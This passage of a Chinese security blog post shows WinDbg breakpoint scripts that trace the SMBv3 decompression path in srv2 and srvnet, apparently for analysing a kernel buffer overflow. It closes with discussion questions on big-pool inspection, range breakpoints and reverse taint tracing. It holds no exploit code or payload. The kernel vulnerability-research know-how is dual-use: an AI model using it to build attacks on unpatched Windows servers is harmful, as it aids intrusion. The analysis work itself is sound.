poi(rsp+0x88);.echo;g&quot;</span><br><span class="line">bp nt!RtlDecompressBufferXpressLz+0x2D0 &quot;.printf \&quot;RtlDecompressBufferXpressLz (), qmemcpy(dst&#x3D;0x%I64x, src&#x3D;0x%I64x, count&#x3D;0x%I64x)\&quot;, rdi, rsi, r9;.echo&quot;</span><br><span class="line">bp srvnet!SmbCompressionDecompress &quot;.printf \&quot;srvnet!SmbCompressionDecompress(CompressionFormat&#x3D;%d, CompressedBuffer&#x3D;0x%I64x, CompressedBufferSize&#x3D;%d, UncompressedBuffer&#x3D;0x%I64x, UncompressedBufferSize&#x3D;0x%I64x\&quot;, ecx, rdx, r8d, r9, poi(rsp+0x90);.echo;g&quot;</span><br><span class="line">bp srvnet!SmbCompressionDecompress+0x85 &quot;.printf \&quot;ExAllocatePoolWithTag(POOL_TYPE&#x3D;512, NumberOfBytes&#x3D;%d(0x%I64x), Tag&#x3D;2SL)\&quot;, edx, edx;.echo;g&quot;</span><br><span class="line">bp srvnet!SmbCompressionDecompress+0x91 &quot;.printf \&quot;ExAllocatePoolWithTag() return 0x%I64x\&quot;, rax;.echo;g&quot;</span><br><span class="line">bp srvnet!SmbCompressionDecompress+0xDF &quot;.printf \&quot;RtlDecompressBufferEx2() return0x%I64x,  FinalUncompressedSize&#x3D;%d(0x%I64x)\&quot;, ebx, poi(rsp+0x98), poi(rsp+0x98);.echo;g&quot;</span><br><span class="line">bp srvnet !SmbCompressionDecompress+0xF2 &quot;.printf \&quot;ExFreePoolWithTag(WorkSpace&#x3D;%d(0x%I64x))\&quot;, rcx, rcx;.echo;g&quot;</span><br><span class="line">bp srv2!Srv2DecompressData &quot;.printf \&quot;srv2!Srv2DecompressData(buf&#x3D;0x%I64x)\n\&quot;, rcx;db rcx L200;.echo;g&quot;</span><br><span class="line">bp srv2!Srv2DecompressData+0x79 &quot;.printf \&quot;srv2!SrvNetAllocateBuffer(Size&#x3D;%d, Unknown&#x3D;%d) \n\&quot;, rcx, rdx;db esp+0x30 LF;dd esp+0x30 L4;.echo;g&quot;</span><br><span class="line">bp srv2!Srv2DecompressData+0x85 &quot;.printf \&quot;srv2!SrvNetAllocateBuffer() &#x3D;0x%I64x \n\&quot;, rax;db rax;.echo;g&quot;</span><br><span class="line">bp srv2!Srv2DecompressData+0xEC &quot;.printf \&quot;FinalUncompressedSize&#x3D;0x%I64x, Size.m128i_i32[1]&#x3D;0x%I64x\&quot;, eax, r14d;.echo;g&quot;</span><br><span class="line">bp srv2!Srv2DecompressData+0x108 &quot;.printf \&quot;srv2!memmove(Src&#x3D;0x%I64x, Dst&#x3D;0x%I64x,Size&#x3D;%d) \n\&quot;, rdx, rcx, r8d;db rdx;.echo&quot;</span><br><span class="line">bp nt!RtlDecompressBufferXpressLz &quot;.printf \&quot; nt!RtlDecompressBufferXpressLz(UncompressedBuffer&#x3D;0x%I64x, UncompressedBufferSize&#x3D;%d, CompressedBuffer&#x3D;0x%I64x, CompressedBufferSize&#x3D;%d,0x%I64x,0x%I64x)\&quot;, rcx, edx, r8, r9d, rsp+0x38, poi(rsp+0x40);.echo;g&quot;</span><br><span class="line">bp srvnet!PplGenericAllocateFunction+0x35</span><br><span class="line">bp nt!RtlDecompressBufferXpressLz+0x2AA</span><br><span class="line">bp srvnet!SrvNetAllocateBuffer+0xD59F&quot;.printf \&quot;srvnet!SrvNetAllocateBuffer(), SrvNetAllocateBufferFromPool()&#x3D;0x%I64x\&quot;, rax;.echo&quot;</span><br></pre></td></tr></table></figure>

<h2 id="8-思考和讨论"><a href="#8-思考和讨论" class="headerlink" title="8 思考和讨论"></a>8 思考和讨论</h2><p>能坚持读到这里确属不易：），我们思考讨论以下3个问题有没有较好的解决办法？</p>
<ol>
<li><p>如何像查看小于PAGE_SIZE的内存使用dt nt!_POOL_HEADER那样，查看large page allocation内存的size结构？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">因为没有large page头部，这些“大池”中的内存页是通过“大池索引表”（nt!PoolBigPageTable）来索引跟踪的；</span><br><span class="line">而用来确认池空间拥有者的池标识同样也没有保存头部信息（因为根本就没有头部），也同样是保存在PoolBigPageTable中。</span><br><span class="line">表的每一个入口点都用一个POOL_TRACKER_BIG_PAGES结构表示。</span><br><span class="line">详见《Sheep Year Kernel Heap Fengshui: Spraying in the Big Kids’ Pool》，作者：Alex Lonescu</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于较大的内存范围，如大于8字节，使用内存访问断点？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开发一个WinDBG插件，设置指定范围内存的PAGE属性，触发异常</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于较复杂的执行流程，从最终的数据，如何便捷的向前溯源过往有关分支？有点类似反向污点数据追踪。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开发一个WinDBG插件若RIP不等于预期的地址，就不断的输出当前指令及寄存器状态到日志</span><br></pre></td></tr></table></figure></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">stxletto</p>
  <div class="site-description" itemprop="description">安全风云波澜壮阔，对酒当歌人间值得。</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">3</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/stxletto" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;stxletto" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/u/6355991245" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;6355991245" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">stxletto</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
